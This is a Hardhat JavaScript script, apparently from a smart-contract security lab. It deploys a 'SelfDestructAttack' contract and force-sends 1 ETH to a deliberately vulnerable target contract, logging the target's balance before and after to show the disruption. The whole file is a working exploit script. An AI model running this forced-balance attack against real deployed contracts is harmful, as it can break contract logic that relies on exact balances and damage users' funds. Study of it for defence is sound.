const hre = require("hardhat");

async function main() {
    const [attacker] = await hre.ethers.getSigners();
    console.log("[+] Self-Destruct Attack initiated");

    const deployments = require("../deployments.json");

    const SelfDestructAttack = await hre.ethers.getContractFactory("SelfDestructAttack");
    const contract = await SelfDestructAttack.deploy();
    await contract.deployed();

    const target = deployments.ReentrancyVulnerable;
    const before = await hre.ethers.provider.getBalance(target);

    console.log("[i] Target balance before:", hre.ethers.utils.formatEther(before), "ETH");

    const tx = await contract.forceSend(target, {value: hre.ethers.utils.parseEther("1")});
    await tx.wait();

    const after = await hre.ethers.provider.getBalance(target);
    console.log("[✓] Forced transfer complete");
    console.log("    Target balance after:", hre.ethers.utils.formatEther(after), "ETH");
    console.log("    Logic potentially broken by unexpected balance change");
}

main().catch(console.error);
